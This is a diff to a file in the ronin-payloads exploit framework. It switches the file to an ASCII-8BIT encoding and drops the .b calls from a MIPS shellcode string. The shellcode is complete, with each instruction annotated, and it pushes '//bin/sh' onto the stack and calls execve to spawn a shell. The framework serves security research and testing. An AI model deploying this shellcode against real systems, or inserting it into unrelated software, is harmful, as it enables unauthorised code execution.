@@ -1,3 +1,4 @@
+# encoding: ASCII-8BIT
 # frozen_string_literal: true
 #
 # ronin-payloads - A Ruby micro-framework for writing and running exploit
@@ -51,18 +52,18 @@ module Ronin
             # Builds the shellcode.
             #
             def build
-              @payload = "\x28\x06\xff\xff".b + # slti    a2,zero,-1
-                         "\x3c\x0f\x2f\x2f".b + # lui     t7,0x2f2f
-                         "\x35\xef\x62\x69".b + # ori     t7,t7,0x6269
-                         "\xaf\xaf\xff\xf4".b + # sw      t7,-12(sp)
-                         "\x3c\x0e\x6e\x2f".b + # lui     t6,0x6e2f
-                         "\x35\xce\x73\x68".b + # ori     t6,t6,0x7368
-                         "\xaf\xae\xff\xf8".b + # sw      t6,-8(sp)
-                         "\xaf\xa0\xff\xfc".b + # sw      zero,-4(sp)
-                         "\x27\xa4\xff\xf4".b + # addiu   a0,sp,-12
-                         "\x28\x05\xff\xff".b + # slti    a1,zero,-1
-                         "\x24\x02\x0f\xab".b + # li      v0,4011
-                         "\x01\x01\x01\x0c".b   # syscall 0x40404
+              @payload = "\x28\x06\xff\xff" + # slti    a2,zero,-1
+                         "\x3c\x0f\x2f\x2f" + # lui     t7,0x2f2f
+                         "\x35\xef\x62\x69" + # ori     t7,t7,0x6269
+                         "\xaf\xaf\xff\xf4" + # sw      t7,-12(sp)
+                         "\x3c\x0e\x6e\x2f" + # lui     t6,0x6e2f
+                         "\x35\xce\x73\x68" + # ori     t6,t6,0x7368
+                         "\xaf\xae\xff\xf8" + # sw      t6,-8(sp)
+                         "\xaf\xa0\xff\xfc" + # sw      zero,-4(sp)
+                         "\x27\xa4\xff\xf4" + # addiu   a0,sp,-12
+                         "\x28\x05\xff\xff" + # slti    a1,zero,-1
+                         "\x24\x02\x0f\xab" + # li      v0,4011
+                         "\x01\x01\x01\x0c"   # syscall 0x40404
             end
 
           end
